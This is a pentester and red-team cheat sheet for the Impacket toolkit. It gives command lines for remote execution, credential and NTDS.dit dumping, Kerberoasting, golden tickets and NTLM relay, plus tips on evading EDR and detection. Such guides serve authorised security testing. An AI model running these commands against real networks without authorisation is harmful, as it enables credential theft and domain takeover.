
# Impacket – Pentester & Red Team Guide

---

## 1. Overview

Impacket is a collection of Python classes for working with network protocols, designed for crafting and decoding packets, manipulating network sessions, and interacting with services at a low level.  
It is heavily used in penetration testing, red teaming, and adversary emulation, especially for Windows network exploitation and Active Directory attacks.

**Key capabilities:**
- SMB, MSRPC, WMI, LDAP, Kerberos protocol support
- Credential dumping & authentication attacks
- Remote command execution on Windows hosts
- Lateral movement and domain enumeration
- Packet manipulation for protocol testing

---

## 2. Installation

```bash
pip install impacket
# Or for latest dev version:
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```


---

## 3. Structure

Impacket has two main components:

1. **Library modules** – Python classes for protocols like SMB, NMB, MSRPC, Kerberos, NTLM, LDAP, RDP.
2. **Example scripts** – Ready-to-use offensive tools built with the library.

---

## 4. Core Example Scripts for Pentesters

| Script                  | Purpose |
|-------------------------|---------|
| `psexec.py`              | Remote command execution over SMB (similar to Sysinternals PsExec) |
| `wmiexec.py`             | Execute commands over WMI |
| `smbexec.py`             | Semi-interactive shell over SMB |
| `atexec.py`              | Execute commands via Task Scheduler (AT jobs) |
| `dcomexec.py`            | Execute commands over DCOM |
| `secretsdump.py`         | Dump SAM, LSA, NTDS.dit credentials |
| `ticketer.py`            | Create Kerberos tickets (Golden/Silver tickets) |
| `getTGT.py`              | Request Kerberos TGT with password/hash |
| `getST.py`               | Request Kerberos Service Ticket |
| `lookupsid.py`           | SID enumeration via SMB |
| `rpcdump.py`             | Enumerate RPC endpoints |
| `ntlmrelayx.py`          | Relay NTLM authentication to other services |
| `mssqlclient.py`         | Connect to and exploit MS SQL servers |
| `rdp_check.py`           | Check RDP service availability |
| `samrdump.py`            | Enumerate SAMR users and groups |
| `addcomputer.py`         | Add a machine account to the domain |
| `findDelegation.py`      | Find delegation-enabled accounts in AD |
| `GetUserSPNs.py`         | Kerberoasting attack – extract SPNs for cracking |
| `GetNPUsers.py`          | AS-REP roasting attack |

---

## 5. Library Modules of Interest

- `impacket.smb` – SMB1 protocol support
- `impacket.smb3` – SMB3 protocol support
- `impacket.smbconnection` – High-level SMB client
- `impacket.dcerpc` – DCERPC over SMB/Named Pipes
- `impacket.krb5` – Kerberos ticket manipulation
- `impacket.ldap` – LDAP interaction for AD enumeration
- `impacket.ntlm` – NTLM authentication handling
- `impacket.structure` – Binary struct helpers

## 6. Core Library Modules

- **SMB & SMB3**: `impacket.smb`, `impacket.smb3`, `impacket.smbconnection`
- **MSRPC/DCERPC**: `impacket.dcerpc.v5`
- **Kerberos**: `impacket.krb5`
- **NTLM**: `impacket.ntlm`
- **LDAP**: `impacket.ldap`
- **Packet structures**: `impacket.structure`
- **Networking**: `impacket.nmb`

These can be imported for **custom exploitation scripts** beyond the included examples.

---

## 7. Offensive Use Cases

### 7.1 Remote Command Execution
- **SMB-based**: `psexec.py`, `smbexec.py`, `wmiexec.py`
- **Task Scheduler**: `atexec.py`
- **DCOM**: `dcomexec.py`

Example:
```bash
python3 wmiexec.py DOMAIN/user:pass@target
```

### 7.2 Credential Dumping
- Dump hashes and secrets from remote systems:
```bash
python3 secretsdump.py DOMAIN/user:pass@target
```
- Dump NTDS.dit from DC over SMB:
```bash
python3 secretsdump.py DOMAIN/admin@dc-ip -just-dc
```

### 7.3 Kerberos Attacks
- **AS-REP Roasting**:
```bash
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
```
- **Kerberoasting**:
```bash
python3 GetUserSPNs.py domain.local/user:pass -request
```
- **Golden Ticket**:
```bash
python3 ticketer.py -nthash <krbtgt_hash> -domain domain.local user
```

### 7.4 NTLM Relay Attacks
```bash
python3 ntlmrelayx.py -tf targets.txt -smb2support
```
- Relays captured NTLM authentication to SMB/LDAP/HTTP targets.
- Supports dumping AD objects or adding domain users.

### 7.5 Active Directory Enumeration
- Enumerate users/groups:
```bash
python3 lookupsid.py domain/user:pass@target
```
- Dump SAMR info:
```bash
python3 samrdump.py target
```
- Find delegation accounts:
```bash
python3 findDelegation.py -dc-ip <DC-IP> domain/user:pass
```

---

## 8. Red Team Tips

- Always test NTLM relay feasibility before engagement.
- Chain Impacket with Responder for credential capture → relay with `ntlmrelayx.py`.
- For stealth, prefer `atexec.py` or `dcomexec.py` over `psexec.py` (less EDR noise).
- Use `smbexec.py` for semi-interactive shells without dropping binaries.
- Combine `GetUserSPNs.py` output with `hashcat` for offline cracking.
- When dumping NTDS, use `-no-pass` with a hash for pass-the-hash scenarios.

---

## 9. Detection Evasion

- Avoid default Impacket User-Agent or SMB dialect if possible (patch library).
- Modify script output to blend with legitimate admin traffic.
- Limit scan speed and avoid enumerating the entire domain at once.
- Use Kerberos auth where possible to reduce NTLM logon events.

---

## 10. Troubleshooting

- **"STATUS_ACCESS_DENIED"**: Check credentials and permissions.
- **DCERPC runtime errors**: Ensure correct pipe or UUID for service.
- **Timeouts**: Increase `-timeout` or verify target availability.
- **Kerberos errors**: Sync time with the domain.

---


## 11. Integration with Other Tools

- **Responder** → Capture NTLM → Relay via Impacket.
- **CrackMapExec** → Use Impacket libs for custom modules.
- **Cobalt Strike** → Execute Impacket scripts through Beacon.
- **BloodHound** → Feed enumeration data from Impacket.

---

## 12. Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| STATUS_ACCESS_DENIED | No privileges | Use admin creds or escalate |
| Kerberos KRB_AP_ERR_SKEW | Clock skew | Sync time with DC |
| DCERPC Unknown Interface | Wrong UUID | Enumerate with rpcdump |
| Broken Pipe | AV/EDR kill | Use stealthier exec (DCOM) |

---


## 13. Packet Crafting & Custom Exploits

Impacket’s structures allow crafting raw SMB packets:

```python
from impacket.smb import NewSMBPacket
pkt = NewSMBPacket()
pkt['Flags1'] = 0x18
pkt['Flags2'] = 0xc807
print(pkt.getData())
```

Custom Kerberos TGS request:
```python
from impacket.krb5.asn1 import TGS_REQ
# Craft and send a forged request here...
```

---
